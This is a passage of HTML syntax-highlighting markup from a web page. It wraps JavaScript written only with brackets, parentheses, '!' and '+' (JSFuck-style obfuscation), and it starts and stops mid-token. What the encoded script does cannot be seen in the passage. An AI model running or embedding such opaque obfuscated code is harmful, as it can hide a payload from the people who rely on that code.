class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token 